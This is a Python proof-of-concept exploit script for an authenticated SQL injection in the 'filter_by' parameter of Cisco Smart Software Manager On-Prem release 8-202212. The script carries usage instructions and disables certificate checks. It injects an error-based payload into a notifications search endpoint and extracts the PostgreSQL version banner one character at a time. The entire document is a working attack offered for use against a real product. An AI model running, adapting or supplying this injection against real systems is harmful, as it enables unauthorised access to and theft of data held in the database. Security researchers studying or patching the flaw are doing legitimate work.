"""
Smart Software Manager On-Prem Release 8-202212 - Authenticated SQL Injection in 'filter_by' parameter
Download link: https://software.cisco.com/download/home/286285506/type/286326948/release/8-202212

Usage:
1. Update host and cookies variables,
2. Run `python3 exploit.py`

Tested on Ubuntu 22.04.1 LTS, Python 3.10.6

by redfr0g@stmcyber 2023
"""

import requests
import string
import warnings

# script parameters, update accoridingly
host = "<IP>:8443"
cookies = {"_lic_engine_session": "<COOKIE>", "XSRF-TOKEN": "<CSRFTOKEN>"}


url = "https://" + host + "/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+'P%25')+THEN+0+ELSE+1+END)--%20&filter_val=a&offset=0&limit=10"
headers = {"Accept": "application/json", "Content-Type": "application/json"}
chars = string.printable[0:95]
result = []
search = True

print("[+] Cisco Smart Software Manager Release 8-202212 SQL Injection PoC")
print("[+] Starting DBMS banner enumeration...")

# do error based sql injection until no match found
while search:
    for char in chars:
        url = "https://" + host + "/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+'" + ''.join(result) + char + "%25')+THEN+0+ELSE+1+END)--%20&filter_val=a&offset=0&limit=10"
        # disable invalid cert warnings
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            r = requests.get(url, headers=headers, cookies=cookies, verify=False)
        if "PG::DivisionByZero" in r.text:
            # update and print result
            result.append(char)
            print("[+] DBMS Banner: " + ''.join(result))
            break
        if char == " ":
            # stop search if no match found
            search = False